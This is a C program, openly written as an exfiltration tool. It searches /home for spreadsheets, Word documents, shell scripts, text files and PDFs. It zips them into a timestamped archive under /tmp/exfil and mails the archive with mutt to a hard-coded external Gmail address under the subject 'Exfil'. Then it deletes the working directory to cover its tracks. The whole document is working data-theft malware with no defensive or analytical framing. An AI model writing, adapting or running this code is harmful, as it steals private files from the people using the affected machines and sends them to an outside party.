#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h> // for access()

#define WORKDIR "/tmp/exfil"

// File extensions to collect
const char *exts[] = {"xlsx", "docx", "sh", "txt", "pdf"};
int ext_count = 5;

int main() {
    char cmd[1024], archive[256], timestamp[64];
    time_t now = time(NULL);
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));

    // 1 Create working directory
    system("mkdir -p " WORKDIR);

    // 2 Find files with specified extensions
    strcpy(cmd, "find /home -type f \\( ");
    for (int i = 0; i < ext_count; i++) {
        char buffer[128];
        sprintf(buffer, "-iname \"*.%s\" ", exts[i]);
        strcat(cmd, buffer);
        if (i != ext_count - 1) strcat(cmd, "-o ");
    }
    strcat(cmd, "\\) > " WORKDIR "/file_list.txt");

    printf("[+] Executing: %s\n", cmd);
    system(cmd);

    // 3 Check if any file was found
    FILE *fp = fopen(WORKDIR "/file_list.txt", "r");
    if (!fp) {
        printf("[!] Could not open file list. Exiting.\n");
        return 1;
    }
    int has_files = 0;
    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        if (line[0] != '\n') { 
            has_files = 1;
            break;
        }
    }
    fclose(fp);

    if (!has_files) {
        printf("[!] No files found. Exiting.\n");
        return 0;
    }

    // 4 Create ZIP archive (keeping full paths to avoid duplicates)
    sprintf(archive, WORKDIR "/exfil_%s.zip", timestamp);
    sprintf(cmd, "zip %s -@ < %s/file_list.txt", archive, WORKDIR);
    system(cmd);
    printf("[+] Archive created: %s\n", archive);

    // 5 Verify archive exists
    if (access(archive, F_OK) != 0) {
        printf("[!] Archive was not created. Skipping email.\n");
        return 1;
    }

    // 6 Send email with the archive
    sprintf(cmd, "echo 'Collected files from %s' | mutt -s 'Exfil %s' -a %s -- phuc9293@gmail.com",
            getenv("HOSTNAME"), timestamp, archive);
    system(cmd);
    printf("[+] Email sent with archive.\n");

    // 7 Cleanup
    sprintf(cmd, "rm -rf %s", WORKDIR);
    system(cmd);

    return 0;
}
